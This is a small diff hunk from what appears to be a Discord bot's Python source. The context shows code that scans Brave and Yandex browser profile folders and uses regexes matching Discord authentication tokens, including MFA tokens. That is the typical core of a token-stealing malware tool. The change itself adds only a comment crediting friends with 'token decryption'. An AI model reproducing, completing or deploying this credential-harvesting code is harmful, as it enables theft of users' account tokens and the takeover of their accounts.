@@ -1208,7 +1208,7 @@ async def on_message(message):
                 LOCAL + "\\BraveSoftware\\Brave-Browser\\User Data\\Default",
                 LOCAL + "\\Yandex\\YandexBrowser\\User Data\\Default"
             ]
-
+            #token decryption made by me and some of my friends
 
             regex1 = "[\\w-]{24}\.[\\w-]{6}\\.[\\w-]{27}"
             regex2 = r"mfa\\.[\\w-]{84}"
